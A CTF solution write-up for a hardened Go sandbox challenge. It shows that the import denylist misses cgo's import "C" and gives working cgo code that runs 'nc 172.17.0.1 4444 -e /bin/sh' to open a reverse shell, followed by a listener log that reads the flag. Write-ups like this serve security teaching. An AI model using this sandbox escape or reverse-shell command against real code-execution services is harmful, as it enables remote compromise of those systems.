# Solution

This challenge is based on Snyk's roadrunner CTF challenge which is further hardened and not as easily bypassable.

By reviewing the code one should notice:
```go
func (s *Sandbox) validate() error {
	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, SourceFile, *&s.Script, 0)
	if err != nil {
		return err
	}

	for _, i := range f.Imports {
		val := strings.Trim(i.Path.Value, "\"")
		for _, pkg := range s.pkgNames {
			if pkg != "" && strings.HasPrefix(val, pkg) {
				return fmt.Errorf("forbidden import: %s", val)
			}
		}
	}

	return nil
}
```

Imports are validated against a set of pre-built package names resolved in `NewSandbox` function:
```go
pkgs, err := packages.Load(&packages.Config{Mode: packages.NeedName}, "std")
if err != nil {
	return nil, fmt.Errorf("failed to load packages: %v", err)
}

pkgNames := make([]string, len(pkgs))
for i, pkg := range pkgs {
	if pkg.Name != "fmt" {
		pkgNames[i] = pkg.Name
	}
}
```

It is observable that all std packages are loaded into the denylist except for `fmt` package which is allowed.

The list of these packages can be seen with `go list`:
```sh
$ go list std
archive/tar
archive/zip
bufio
bytes
compress/bzip2
...
```

By carefully observing the list, you might notice that a specific integration import is not on the list: `import "C"`.

With this in mind, we can supply any C code to the Go code and call it from the main function:
```go
package main

//#include <stdio.h>
//void shell() {
//	system("nc 172.17.0.1 4444 -e /bin/sh");
//}
import "C"

func main() {
	C.shell()
}
```

The presented code executes a reverse shell which can then be leveraged to read the flag:
```
$ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.17.0.2 38939
id
uid=100(ctf) gid=101(ctf) groups=101(ctf)
ls
sandbox
src.go
pwd
/tmp/exec2380286296
cd /
ls
app
bin
dev
etc
go
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cd /app
ls
flag.txt
go.mod
go.sum
index.html
main.go
cat flag.txt
ibctf{m4y_th3-ext3rnal-SEE-b3-w1th-y0U}
```
